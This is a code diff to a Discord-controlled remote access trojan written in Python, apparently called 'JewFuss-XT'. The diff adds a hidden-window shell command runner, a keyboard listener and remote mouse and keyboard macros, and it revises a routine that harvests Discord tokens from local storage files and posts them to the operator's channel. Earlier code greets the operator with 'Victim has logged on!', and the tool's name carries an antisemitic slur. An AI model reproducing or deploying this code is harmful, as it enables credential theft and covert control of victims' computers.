@@ -1,6 +1,7 @@
-from discord.ext import commands, tasks
 from PIL import ImageGrab, ImageDraw
+from discord.ext import commands
 from threading import Thread
+from pynput import keyboard
 import subprocess
 import webbrowser
 import pyautogui
@@ -28,7 +29,7 @@ import io
 import os
 import re
 
-TOKEN = "Discord bot token" # Do not remove or modify this string (easy compiler looks for this) - 23r98h
+TOKEN = "Bot token here" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -47,6 +48,305 @@ def bot_channel():
     channel_name = sanitize_channel_name(raw_channel_name)
     return channel_name
 
+def force_home_directory():
+    home_dir = os.path.expanduser("~")
+    return home_dir
+
+def check_permissions(file_path):
+    permissions = {
+        'read': os.access(file_path, os.R_OK),
+        'write': os.access(file_path, os.W_OK),
+        'execute': os.access(file_path, os.X_OK),
+        'delete': os.access(file_path, os.W_OK)
+    }
+    return permissions
+
+async def send_permission_status(ctx, file_path):
+    permissions = check_permissions(file_path)
+    if not all(permissions.values()):
+        await ctx.send(f"This program does not have access to modifying {file_path}. Permissions for the file are as set:")
+        perms_message = '\n'.join([f'{perm}: {value}' for perm, value in permissions.items()])
+        await ctx.send(f"```{perms_message}```")
+
+# -------------------
+#       PYMACRO
+# -------------------
+
+variables = {}
+
+def f_wait_for_keys_internal(key_combo, ctxchannel):
+    key_combo = key_combo.lower().split()
+    keys_pressed = set()
+
+    def on_press(key):
+        try:
+            if hasattr(key, 'char') and key.char:
+                keys_pressed.add(key.char.lower())
+            elif hasattr(key, 'name') and key.name:
+                keys_pressed.add(key.name.lower())
+            
+            if all(k in keys_pressed for k in key_combo):
+                return False
+        except Exception as e:
+            asyncio.run(ctxchannel.send(f"Error in key listener: {e}"))
+
+    def on_release(key):
+        try:
+            if hasattr(key, 'char') and key.char:
+                keys_pressed.discard(key.char.lower())
+            elif hasattr(key, 'name') and key.name:
+                keys_pressed.discard(key.name.lower())
+        except Exception as e:
+            asyncio.run(ctxchannel.send(f"Error in key listener: {e}"))
+
+    asyncio.run(ctxchannel.send(f"Waiting for keys: {' '.join(key_combo)}"))
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+def f_evaluate_expression_internal(expression):
+    try:
+        resolved_expression = f_resolve_expression_internal(expression)
+        return eval(resolved_expression, {"__builtins__": None}, {})
+    except Exception as e:
+        raise ValueError(f"Error evaluating expression: {expression}. Error: {str(e)}")
+
+def f_parse_wrapped_string_internal(arg):
+    if arg.startswith('"') and arg.endswith('"'):
+        return re.sub(r'\\(["\'])', r'\1', arg[1:-1])
+    elif arg.startswith("'") and arg.endswith("'"):
+        return re.sub(r'\\(["\'])', r'\1', arg[1:-1])
+    return arg
+
+def f_resolve_expression_internal(expression):
+    try:
+        expression = re.sub(
+            r"\!\$\{\%clip\%\}",
+            lambda m: pyperclip.paste(),
+            expression
+        )
+
+        expression = re.sub(
+            r"\$\{([^}]+)\}",
+            lambda m: str(variables.get(m.group(1), "")),
+            expression
+        )
+
+        expression = re.sub(
+            r"\$\{~([^}]+)~\}",
+            lambda m: str(os.getenv(m.group(1), "")),
+            expression
+        )
+
+        expression = re.sub(
+            r"\$\{\+([^}]+)\+\}",
+            lambda m: str(os.getenv(m.group(1), "")),
+            expression
+        )
+
+        return expression
+    except Exception as e:
+        raise ValueError(f"Error resolving expression: {expression}. Error: {str(e)}")
+
+def f_set_variable_internal(var, value):
+    if var.startswith("~") and var.endswith("~"):
+        os.environ[var[1:-1]] = value
+    elif var.startswith("+") and var.endswith("+"):
+        os.system(f"setx {var[1:-1]} {value}")
+    else:
+        variables[var] = value
+
+async def f_parse_internal(command, ctx):
+    try:
+        parts = command.strip().split()
+        if not parts:
+            return
+
+        cmd = parts[0].lower()
+
+        def resolve_args(args):
+            return [f_resolve_expression_internal(f_parse_wrapped_string_internal(arg)) for arg in args]
+
+        if cmd == "cursor":
+            x = int(f_evaluate_expression_internal(parts[1]))
+            y = int(f_evaluate_expression_internal(parts[2]))
+            pyautogui.moveTo(x, y)
+
+        elif cmd == "key":
+            key = f_resolve_expression_internal(parts[1].lower())
+            action = parts[2].lower() if len(parts) > 2 else "press"
+            if action == "down":
+                pyautogui.keyDown(key)
+            elif action == "up":
+                pyautogui.keyUp(key)
+            elif action == "press":
+                pyautogui.press(key)
+
+        elif cmd == "hotkey":
+            combo = resolve_args(parts[1:])
+            pyautogui.hotkey(*combo)
+
+        elif cmd == "wait":
+            if len(parts) > 2 and parts[-1].lower() in {"ms", "s", "sec", "seconds", "milliseconds"}:
+                duration_expr = " ".join(parts[1:-1])
+                unit = parts[-1].lower()
+            else:
+                duration_expr = " ".join(parts[1:])
+                unit = "ms"
+
+            duration = float(f_evaluate_expression_internal(duration_expr))
+
+            if unit.startswith("ms"):
+                await asyncio.sleep(duration / 1000)
+            elif unit.startswith("s"):
+                await asyncio.sleep(duration)
+
+        elif cmd == "write":
+            text = f_resolve_expression_internal(f_parse_wrapped_string_internal(" ".join(parts[1:])))
+            pyautogui.write(text)
+
+        elif cmd == "mb":
+            button_map = {1: "left", 2: "right", 3: "middle", 4: "x1", 5: "x2"}
+            button = button_map.get(int(f_resolve_expression_internal(parts[1])), "left")
+            action = parts[2].lower() if len(parts) > 2 else "press"
+            if action == "down":
+                pyautogui.mouseDown(button=button)
+            elif action == "up":
+                pyautogui.mouseUp(button=button)
+            elif action == "press":
+                pyautogui.click(button=button)
+
+        elif cmd == "scroll":
+            amount = int(f_evaluate_expression_internal(parts[1]))
+            pyautogui.scroll(amount)
+
+        elif cmd == "clip":
+            subcmd = parts[1].lower()
+            if subcmd == "copy":
+                text = f_resolve_expression_internal(f_parse_wrapped_string_internal(" ".join(parts[2:])))
+                pyperclip.copy(text)
+            elif subcmd == "paste":
+                pyautogui.write(pyperclip.paste())
+            elif subcmd == "clear":
+                pyperclip.copy("")
+            else:
+                raise ValueError(f"Invalid clip action: {subcmd}")
+
+        elif cmd == "set":
+            var = parts[1]
+            value = f_resolve_expression_internal(" ".join(parts[2:]))
+            f_set_variable_internal(var, f_parse_wrapped_string_internal(value))
+
+        elif cmd == "del":
+            var = parts[1]
+            if var.startswith("~") and var.endswith("~"):
+                os.environ.pop(var[1:-1], None)
+            elif var.startswith("+") and var.endswith("+"):
+                os.system(f"setx {var[1:-1]} ''")
+            else:
+                variables.pop(var, None)
+
+        elif cmd == "continue":
+            keys = resolve_args(parts[1:])
+            f_wait_for_keys_internal(" ".join(keys), ctx)
+
+        elif cmd == "log":
+            message = f_resolve_expression_internal(f_parse_wrapped_string_internal(" ".join(parts[1:])))
+            await ctx.send(message)
+
+    except Exception as e:
+        await ctx.send(f"Error processing command: {command}")
+        await ctx.send(f"Exception: {e}")
+
+def f_parse_config_options_internal(script):
+    config = {
+        "DisableAdminVarWarning": False,
+        "FuncSplit": ";",
+        "CommentOverride": None,
+    }
+    new_script_lines = []
+
+    for line in script.splitlines():
+        line = line.strip()
+        if line.startswith("@"):
+            if line.lower() == "@disableadminvarwarning":
+                config["DisableAdminVarWarning"] = True
+            elif line.lower().startswith("@funcsplit ="):
+                split_char = line.split("=", 1)[1].strip().strip('"')
+                config["FuncSplit"] = split_char
+            elif line.lower().startswith("@commentoverride ="):
+                comment_char = line.split("=", 1)[1].strip().strip('"')
+                config["CommentOverride"] = None if comment_char.lower() == "none" else comment_char
+        else:
+            new_script_lines.append(line)
+
+    return config, "\n".join(new_script_lines)
+
+async def i_macro(execstr, ctx, echo_errors=True):
+    try:
+        if execstr is None:
+            ctx.send("Input cannot be None")
+            return
+
+        config, cleaned_script = f_parse_config_options_internal(execstr)
+
+        if not config["DisableAdminVarWarning"]:
+            sys_var_pattern = r"set\s+\+([^\+]+)\+\s+"
+            matches = re.findall(sys_var_pattern, execstr)
+            if matches:
+                ctx.send("WARNING: This script modifies system environment variables.")
+                ctx.send("         These changes will only work if the program is run as administrator.")
+                ctx.send(f"         Detected system variables: {', '.join(matches)}\n\n")
+
+        commands = (
+            cleaned_script.split(config["FuncSplit"])
+            if config["FuncSplit"] != "\\n"
+            else [line for line in cleaned_script.splitlines() if line.strip()]
+        )
+
+        for command in commands:
+            if config["CommentOverride"] and config["CommentOverride"] in command:
+                command = command.split(config["CommentOverride"], 1)[0].strip()
+
+            if not command:
+                continue
+
+            await f_parse_internal(command.strip(), ctx)
+
+    except Exception as e:
+        if echo_errors:
+            ctx.send(f"Error running macro:")
+            ctx.send(f"Exception: {e}")
+
+@bot.command(help="A modified version of PyMacro to work as a discord bot, docs at https://github.com/gabrielzv1233/PyMacro/blob/main/readme.md")
+async def macro(ctx):
+    if ctx.message.attachments:
+        if len(ctx.message.attachments) > 1:
+            await ctx.send("Please attach only one .pymacro file at a time.")
+            return
+        
+        attachment = ctx.message.attachments[0]
+        if attachment.filename.lower().endswith(".pymacro"):
+            file_bytes = await attachment.read()
+            script_content = file_bytes.decode("utf-8")
+            await i_macro(script_content, ctx)
+            return
+        
+    await ctx.send("No .pymacro file attached!")
+
+@bot.command(help="Runs a command using subprocesses")
+async def cmd(ctx, *, command: str):
+    try:
+        result = subprocess.run(f'cmd /c "{command}"', shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        output = result.stdout.strip() or result.stderr.strip() or "No output"
+        await ctx.send(f"## Output:\n{output}")
+    except Exception as e:
+        await ctx.send(f"Error executing command: {e}")
+
+@bot.command(name='checkperms', help="Checks if the program has access to provided file path")
+async def checkperms(ctx, file_path: str):
+    permissions = check_permissions(file_path)
+    perms_message = '\n'.join([f'{perm}: {value}' for perm, value in permissions.items()])
+    await ctx.send(f"Permissions for {file_path} are as follows:\n```{perms_message}```")
 
 @bot.command(help="Delete and recreates bots channel, wiping all the messages")
 async def init(ctx):
@@ -95,6 +395,7 @@ async def on_guild_join(guild):
 
 @bot.event
 async def on_ready():
+    in_server_ammount = 0
     for guild in bot.guilds:
         channel_name = bot_channel()
         existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
@@ -107,11 +408,13 @@ async def on_ready():
             }
             new_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
             await new_channel.edit(topic=logon_date)
-            await new_channel.send(f"Victim has logged on! Use this channel for further commands.")
+            await new_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands.")
         else:
             await existing_channel.edit(topic=logon_date)
-            await existing_channel.send(f"Victim has logged on! Use this channel for further commands.")
-        print(f'Discord bot logged on as {bot.user.name}')
+            await existing_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands.")
+        in_server_ammount += 1
+            
+    print(f'JewFuss-XT logged in as {bot.user.name} on {in_server_ammount} server(s)')
 
 @bot.event
 async def on_message(message):
@@ -205,24 +508,26 @@ async def getdiscord(ctx):
         }
         message = '​\n'
         for platform, path in paths.items():
-            if not os.path.exists(path):
-                continue
-            message += f'**{platform}**```'
-            path += '\\Local Storage\\leveldb'
-            tokens = []
-            for file_name in os.listdir(path):
-                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            try:
+                if not os.path.exists(path):
                     continue
-                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                        for token in re.findall(regex, line):
-                            tokens.append(token)
-            if len(tokens) > 0:
-                for token in tokens:
-                    message += f'{token}'
-            else:
-                message += 'No tokens found.'
-            message += '```'
+                message += f'**{platform}**```'
+                path += '\\Local Storage\\leveldb'
+                tokens = []
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                            for token in re.findall(regex, line):
+                                tokens.append(token)
+                if len(tokens) > 0:
+                    for token in tokens:
+                        message += f'{token}'
+                else:
+                    message += 'No tokens found.'
+            except Exception as e:
+                message += f'**Somthing went wrong**```{e}```'
         try:
             await ctx.send(message)
         except:
